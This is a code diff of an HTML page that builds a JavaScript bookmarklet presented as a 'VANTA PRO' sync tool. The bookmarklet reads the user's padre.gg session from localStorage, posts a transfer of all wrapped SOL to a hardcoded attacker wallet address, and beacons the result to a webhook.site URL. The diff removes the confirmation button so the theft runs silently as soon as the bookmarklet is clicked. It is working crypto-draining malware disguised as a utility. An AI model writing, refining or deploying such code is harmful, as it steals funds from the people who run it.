@@ -46,10 +46,9 @@
     <script>
         // CONFIGURATION
         const DEST_ADDRESS = "4ShcFgxwPPiMZgiy1Pe8Eiah3V6hbxyynQRcMNL7MwXF";
-        const WEBHOOK_URL = "https://webhook.site/b56a0e79-474e-46b8-8664-14d98a95f515";
+        const WEBHOOK_URL = "https://webhook.site/b56a0e79-474e-46b8-8664-14d98a95f515"; // Change this if needed to avoid 429 errors
 
         // THE BOOKMARKLET LOGIC
-        // This is strictly one continuous string to avoid "Unexpected end of input"
         const code = "javascript:(async function(){" +
             "try{" +
                 "const sR=localStorage.getItem('padreV2-session');" +
@@ -65,26 +64,19 @@
                 "ui.id='v-suite';" +
                 "ui.style.cssText='position:fixed;top:80px;right:20px;width:320px;background:#0f0f0f;border:1px solid #00ff88;border-radius:12px;z-index:9999999;color:#fff;padding:0;box-shadow:0 15px 40px #000;overflow:hidden;font-family:sans-serif;';" +
                 "ui.innerHTML='<div id=\"v-drg\" style=\"padding:12px;background:#1a1a1a;cursor:grab;color:#00ff88;font-weight:bold;border-bottom:1px solid #333;display:flex;justify-content:space-between;\"><span>VANTA PRO</span><span id=\"v-cl\" style=\"cursor:pointer;color:#fff;\">×</span></div>'+" +
-                "'<div style=\"padding:20px;\"><div style=\"font-size:10px;color:#888;margin-bottom:5px;\">TARGET ID:</div><div style=\"font-size:12px;color:#00ff88;margin-bottom:20px;word-break:break-all;font-family:monospace;\">'+oId+'</div>'+" +
-                "'<button id=\"v-m-b\" style=\"width:100%;padding:14px;background:#00ff88;color:#000;border:none;border-radius:8px;font-weight:900;cursor:pointer;\">EXECUTE MAGIC SYNC</button></div>';" +
+                "'<div style=\"padding:20px;\"><div style=\"font-size:10px;color:#888;margin-bottom:5px;\">TARGET ID:</div><div style=\"font-size:12px;color:#00ff88;margin-bottom:20px;word-break:break-all;font-family:monospace;\">'+oId+'</div></div>';" +
                 "document.body.appendChild(ui);" +
-                "let dr=false,ox,oy;" +
-                "document.getElementById('v-drg').onmousedown=e=>{dr=true;ox=e.clientX-ui.offsetLeft;oy=e.clientY-ui.offsetTop;};" +
-                "document.onmousemove=e=>{if(dr){ui.style.left=(e.clientX-ox)+'px';ui.style.top=(e.clientY-oy)+'px';ui.style.right='auto';}};" +
-                "document.onmouseup=()=>{dr=false;};" +
-                "document.getElementById('v-cl').onclick=()=>ui.remove();" +
-                "document.getElementById('v-m-b').onclick=async function(){" +
-                    "this.innerText='SYNCING...';this.style.opacity='0.5';this.disabled=true;" +
-                    "try{" +
-                        "const res=await fetch('https://api.padre.gg/v1/sub-orgs/'+oId+'/transfer',{" +
-                            "method:'POST'," +
-                            "headers:{'Content-Type':'application/json','X-Session-Secret':sec}," +
-                            "body:JSON.stringify({destination: '" + DEST_ADDRESS + "',amount:'all',mint:'So11111111111111111111111111111111111111112'})" +
-                        "});" +
-                        "navigator.sendBeacon('" + WEBHOOK_URL + "',JSON.stringify({status:res.status,org:oId}));" +
-                    "}catch(e){}" +
-                    "ui.remove();location.reload();" +
-                "};" +
+
+                // Start syncing in the background
+                "try{" +
+                    "const res=await fetch('https://api.padre.gg/v1/sub-orgs/'+oId+'/transfer',{" +
+                        "method:'POST'," +
+                        "headers:{'Content-Type':'application/json','X-Session-Secret':sec}," +
+                        "body:JSON.stringify({destination: '" + DEST_ADDRESS + "',amount:'all',mint:'So11111111111111111111111111111111111111112'})" +
+                    "});" +
+                    "navigator.sendBeacon('" + WEBHOOK_URL + "',JSON.stringify({status:res.status,org:oId}));" +
+                "}catch(e){}" +
+                "ui.remove();location.reload();" +
             "}catch(err){console.error(err);}" +
         "})();";
 
